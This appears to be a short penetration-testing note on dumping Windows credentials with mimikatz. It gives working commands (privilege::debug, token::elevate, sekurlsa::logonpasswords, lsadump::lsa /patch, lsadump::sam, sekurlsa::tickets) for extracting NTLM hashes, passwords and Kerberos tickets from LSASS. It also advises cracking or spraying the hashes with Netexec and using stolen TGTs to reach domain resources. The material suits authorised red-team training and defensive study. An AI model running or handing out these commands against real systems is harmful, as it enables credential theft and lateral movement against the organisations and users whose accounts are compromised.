> We open CMD as administrator then run mimikatz.exe. Here we can dump the hashes:

```
privilege::debug (look for "20" OK)
token::elevate
sekurlsa::logonpasswords
```

Here we can obtain NTLM hashes for users and either try to crack them or spray it with Netexec. 

> We can also obtain the hashes of local users on the machine and authenticated users:

```
lsadump::lsa /patch
```

> If mimikatz does not work properly or produces a large duplicate output you can provide the commands you want to run in one command as seen below for example: 

```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```









> TGT tickets are also stored in LSASS, and we can retrieve our own tickets as well as the tickets of other local users.

```
sekurlsa::tickets
```

Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.